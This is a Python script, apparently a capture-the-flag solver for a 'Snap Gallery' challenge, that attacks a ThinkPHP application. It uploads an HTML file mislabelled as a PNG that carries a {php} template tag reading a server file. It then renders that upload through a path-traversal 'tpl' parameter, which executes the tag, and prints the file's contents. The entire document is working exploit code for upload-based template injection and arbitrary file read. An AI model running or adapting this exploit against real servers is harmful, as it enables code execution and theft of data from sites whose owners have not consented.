#!/usr/bin/env python3
"""Snap Gallery CTF solver: ThinkPHP template injection via uploaded HTML."""
import argparse
import re
import sys
import uuid
import requests


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='e.g. http://10.234.128.21:22200')
    parser.add_argument('--flag-path', default='/flag.txt')
    args = parser.parse_args()
    base = args.url.rstrip('/')
    session = requests.Session()
    filename = 'snap_' + uuid.uuid4().hex[:12] + '.html'
    marker = 'SNAP_RESULT_'
    # ThinkPHP template tags are compiled to PHP by the server; no literal PHP opening tags.
    payload = marker + '{php}echo file_get_contents(' + repr(args.flag_path) + ');{/php}' + '_END'
    print('[+] Uploading', filename)
    response = session.post(base + '/index.php/upload/upload', files={'image': (filename, payload.encode(), 'image/png')}, timeout=20)
    print('[+] Upload HTTP', response.status_code)
    if response.status_code != 200 or 'アップロード成功' not in response.text:
        print(response.text[:1800]); return 1
    # Default view directory is app/view; uploaded file is root/storage/topic/<filename>.
    tpl = '../../storage/topic/' + filename[:-5]
    print('[+] Rendering template:', tpl)
    response = session.get(base + '/index.php/index/page', params={'tpl': tpl}, timeout=20)
    print('[+] Render HTTP', response.status_code)
    print(response.text[:4000])
    match = re.search(re.escape(marker) + r'(.*?)_END', response.text, re.S)
    if match:
        print('[+] File contents:', match.group(1))
        return 0
    print('[-] No output marker. Inspect response for template path or parser errors.')
    return 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except requests.RequestException as exc:
        print('[-] Request failed:', exc)
        sys.exit(1)
